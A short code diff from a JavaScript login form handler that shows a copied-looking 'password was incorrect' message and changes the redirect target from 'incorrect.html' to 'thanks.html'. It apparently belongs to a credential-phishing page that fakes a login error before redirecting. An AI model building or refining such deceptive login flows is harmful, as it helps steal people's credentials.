@@ -35,13 +35,13 @@ form.addEventListener("submit", (e) => {
       "Sorry, your password was incorrect. Please double-check your password.";
   }, 1000);
   if (clicking == 1) {
-    window.location.replace("incorrect.html");
+    window.location.replace("thanks.html");
   }
     });
 
 
     // setTimeout(function() {
-    //     window.location.replace("incorrect.html");
+    //     window.location.replace("thanks.html");
     // }, 1000)
 
   //   console.log("Incorrect Password!");
